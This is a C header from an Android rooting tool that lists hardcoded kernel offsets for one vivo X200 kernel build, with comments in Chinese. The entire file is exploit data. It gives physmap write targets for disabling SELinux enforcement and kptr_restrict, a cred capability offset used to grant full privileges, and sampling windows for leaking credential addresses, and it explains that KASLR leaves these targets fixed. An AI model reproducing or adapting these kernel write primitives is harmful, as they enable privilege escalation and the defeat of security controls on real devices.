/*
 * SPDX-License-Identifier: Apache-2.0
 * Copyright 2026 GhostLock-X200-App contributors
 *
 * devices_x200_b57.h — 本机型硬编码偏移表（vivo X200 / PD2415 / b57 内核）。
 *
 * 来源：主项目 ghostlock-x200-root v1.3.5 的 tools/offset_tools/win_offs_b57.json
 *       + offsets_auto.py package 产物（40+ 次真机 root 全恒定）。
 * 原理（见 docs/DESIGN.md §2.1）：KASLR 只随机虚拟地址，physmap(direct map)
 *       物理布局恒定 → 写目标（se_p0/w0/GL_LOCK_BASE）全部固定。
 * capsym（STAGE5 写值来源）随 KASLR 变，运行时从 /proc/kallsyms 确定性筛选
 *       （同 offsets_auto.py 的筛选规则），见 runner.c find_capsym()。
 */
#ifndef DEVICES_X200_B57_H
#define DEVICES_X200_B57_H

#define DEV_KERNEL_RELEASE \
    "6.6.89-android15-8-gb57af212129c-abogki457297774-4k"

/* ---- physmap 基址与符号偏移（win_offs_b57.json） ---- */
#define DEV_PHYSMAP_BASE      0xffffff8000000000ULL
#define DEV_SELINUX_STATE_OFF 0x2346ee8ULL   /* selinux_state.enforcing 相对 physmap */
#define DEV_KPTR_RESTRICT_OFF 0x210bd20ULL   /* kptr_restrict 相对 physmap */
#define DEV_ZEROES_BUF_OFF    0x2342820ULL   /* __dump_skip.zeroes 4KB（GL 槽位宿主） */

/* 派生写目标（编译期算好，运行时直接用） */
#define DEV_SE_P0       (DEV_PHYSMAP_BASE + DEV_SELINUX_STATE_OFF) /* 0xffffff8002346ee8 */
#define DEV_W0          (DEV_PHYSMAP_BASE + DEV_KPTR_RESTRICT_OFF - 8) /* 0xffffff800210bd18 */
#define DEV_GL_LOCK_BASE (DEV_PHYSMAP_BASE + DEV_ZEROES_BUF_OFF)   /* 0xffffff8002342820 */

/* GL 槽位（permissive_restore init 清零宿主后无限提权） */
#define DEV_GL_SLOT_SIZE 0x10ULL
#define DEV_GL_SLOT_BAD  1    /* slot 1 (zeroes+0x10) 宿主有毒，跳过（v1.3.5 实证） */

/* task_struct->cred 偏移（STAGE5 写目标 = 泄漏 cred 地址 + CAP_OFF） */
#define DEV_CAP_OFF 56

/* w2host 采样窗口（cred 泄漏） */
#define DEV_W2_IP_LO   0xcba0cULL
#define DEV_W2_IP_HI   0xcc7d4ULL
#define DEV_W2_CRED_IPS { 0xcbc0cULL, 0xcbc10ULL, 0xcbc14ULL, 0xcbc18ULL, \
                          0xcbc1cULL, 0xcc5b0ULL, 0xcc5d4ULL }
#define DEV_W2_CAND_MIN_ADD 0x40000000ULL   /* 排除低 1GB（内核镜像/固件） */

/* clear_vr_tag 参数（b57 内置默认，非 b57 机型须 devices/<id>/vr_offsets.json） */
#define DEV_VR_TAG_A 6
#define DEV_VR_TAG_B 44
#define DEV_VR_TP    1024

/* capsym 筛选窗口（相对 kbase，同 offsets_auto.py live 提取） */
#define DEV_CAPSYM_WIN 0x4000000ULL

#endif /* DEVICES_X200_B57_H */
